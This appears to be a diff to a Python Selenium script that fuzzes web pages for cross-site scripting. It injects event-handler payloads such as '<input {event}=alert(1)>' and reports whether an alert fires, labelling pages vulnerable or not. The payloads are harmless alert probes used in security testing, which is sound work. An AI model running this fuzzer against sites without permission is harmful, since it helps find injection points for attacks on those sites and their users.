@@ -1,24 +1,19 @@
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions
-from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, InvalidSessionIdException
-
-def load_payloads(file='payloads.txt'):
-    with open('payloads.txt', 'r') as infile:
-        payloads = infile.read().split('\n')
-
-    return payloads
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.common.exceptions import TimeoutException, InvalidSessionIdException, NoSuchElementException
+from termcolor import colored
 
 def load_events(file='events.txt'):
     with open('events.txt', 'r') as infile:
         payloads = infile.read().split('\n')
-
     return payloads
 
 def create_driver():
   chrome_options = webdriver.ChromeOptions()
   chrome_options.add_argument('--no-sandbox')
-  chrome_options.add_argument('--headless')
+  chrome_options.add_argument('--headless') 
   chrome_options.add_argument('--disable-gpu')
   driver = webdriver.Chrome(options=chrome_options)
   return driver
@@ -32,29 +27,31 @@ def is_alert_present(driver, payload):
         driver.get(url)
 
     try:
-        driver.getMouse().mouseMove(1, 1)
-        WebDriverWait(driver, 3).until(expected_conditions.alert_is_present())
+        action = ActionChains(driver)
+        img = driver.find_element_by_tag_name("input")
+        action.move_to_element(img).click().perform()
+
+        WebDriverWait(driver, 0.5).until(expected_conditions.alert_is_present())
         alert = driver.switch_to.alert.accept()
         # xss successful
         return True
     except TimeoutException:
-        # xss failed
-        print(url)
+        # xss failed - page rendered but no alert
+        return False
+    except NoSuchElementException:
+        # xss failed - there's no input tag
         return False
     finally:
         driver.close()
 
-def check_xss():
-    driver = create_driver()
-    payloads = load_payloads()
-    for payload in payloads:
-        if is_alert_present(driver, payload):
-            return(payload)
-    return False
-
 
 if __name__ == '__main__':
-    # print(check_xss())
     driver = create_driver()
-    for event in load_events():
-        print(is_alert_present(driver, f'<img src=x {event}=alert(1)>'))
+    events = load_events()
+    try:
+        for event in events:
+            payload = f'<input {event}=alert(1)>'
+            alert = is_alert_present(driver, payload)
+            print(payload, colored('VULNERABLE', 'red') if alert else colored('NOT VULNERABLE', 'green'))
+    finally:
+        driver.quit()
